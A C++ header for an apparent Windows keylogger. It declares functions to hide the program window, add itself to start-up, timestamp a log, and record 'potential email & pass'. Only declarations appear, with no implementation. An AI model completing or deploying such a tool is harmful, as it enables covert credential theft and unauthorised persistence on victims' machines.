#ifndef HUSH_HEADER_H
#define HUSH_HEADER_H


#include <fstream>
#include <iostream>
#include <iomanip>
#include <ctime>
#include <string>
#include <ctype.h>
#include <stdio.h>
#include <windows.h>
#include <Lmcons.h>





//body

//Function Declaration
void hyde();//window
void startUp(std::ofstream& outFile);//start up exe
std::string getFilePath();//get file path of exe
void ts(std::ofstream& outFile); //Time stamp
void PE(std::ofstream& outFile); //Potential email & pass
std::string seekLastLine();//







#endif //HUSH_HEADER_H
